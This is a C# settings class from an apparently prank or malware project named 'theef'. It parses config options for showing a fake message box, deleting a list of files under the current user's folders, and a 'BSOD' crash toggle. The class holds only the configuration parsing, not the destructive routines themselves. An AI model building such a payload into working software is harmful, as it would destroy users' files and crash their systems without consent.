using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace theef
{
    class Settings
    {
        // TODO: Fix the variables (2 version for each, just use one public var)

        // Message box settings.
        private int messageBoxEnabled;
        private string messageBoxTitle;
        private string messageBoxText;
        private MessageBoxIcon messageBoxIcon;
        private MessageBoxButtons messageBoxButtons;

        // File deletion settings.
        private int deleteFiles;
        private string[] files;

        // BSOD settings.
        private int bsodEnabled;

        // Get and sets.
        public int MessageBoxEnabled { get => messageBoxEnabled; set => messageBoxEnabled = value; }
        public string MessageBoxTitle { get => messageBoxTitle; set => messageBoxTitle = value; }
        public string MessageBoxText { get => messageBoxText; set => messageBoxText = value; }
        public MessageBoxIcon MessageBoxIcon { get => messageBoxIcon; set => messageBoxIcon = value; }
        public MessageBoxButtons MessageBoxButtons { get => messageBoxButtons; set => messageBoxButtons = value; }
        public int DeleteFiles { get => deleteFiles; set => deleteFiles = value; }
        public string[] Files { get => files; set => files = value; }
        public int BsodEnabled { get => bsodEnabled; set => bsodEnabled = value; }

        public Settings(String[] settings)
        {
            // ================ Message box settings ================
            MessageBoxEnabled = int.Parse(settings[1]);
            MessageBoxTitle = settings[3];
            MessageBoxText = settings[5];

            // Actual garbage code.
            switch (settings[7].ToLower())
            {
                case "error":
                    MessageBoxIcon = MessageBoxIcon.Error;
                    break;
                case "asterisk":
                    MessageBoxIcon = MessageBoxIcon.Asterisk;
                    break;
                case "exclamation":
                    MessageBoxIcon = MessageBoxIcon.Exclamation;
                    break;
                case "hand":
                    MessageBoxIcon = MessageBoxIcon.Hand;
                    break;
                case "information":
                    MessageBoxIcon = MessageBoxIcon.Information;
                    break;
                case "none":
                    MessageBoxIcon = MessageBoxIcon.None;
                    break;
                case "question":
                    MessageBoxIcon = MessageBoxIcon.Question;
                    break;
                case "stop":
                    MessageBoxIcon = MessageBoxIcon.Stop;
                    break;
                case "warning":
                    MessageBoxIcon = MessageBoxIcon.Warning;
                    break;
            }

            // More garbage.
            switch (settings[9].ToLower())
            {
                case "abort retry ignore":
                    MessageBoxButtons = MessageBoxButtons.AbortRetryIgnore;
                    break;
                case "ok":
                    MessageBoxButtons = MessageBoxButtons.OK;
                    break;
                case "ok cancel":
                    MessageBoxButtons = MessageBoxButtons.OKCancel;
                    break;
                case "retry cancel":
                    MessageBoxButtons = MessageBoxButtons.RetryCancel;
                    break;
                case "yes no":
                    MessageBoxButtons = MessageBoxButtons.YesNo;
                    break;
                case "yes no cancel":
                    MessageBoxButtons = MessageBoxButtons.YesNoCancel;
                    break;
            }

            // ================ File deletion settings. ================
            DeleteFiles = int.Parse(settings[11]);

            // We can't have colons in our config file, so we use | instead.
            settings[12] = settings[12].Replace("|", ":");
            
            // Replace the %USERNAME% with the current username.
            settings[12] = settings[12].Replace("%USERNAME%", Environment.UserName);

            // Split based on the commas
            files = settings[12].Split(',');

            //  ================ BSOD settings. ================
            BsodEnabled = int.Parse(settings[14]);
        }
    }
}
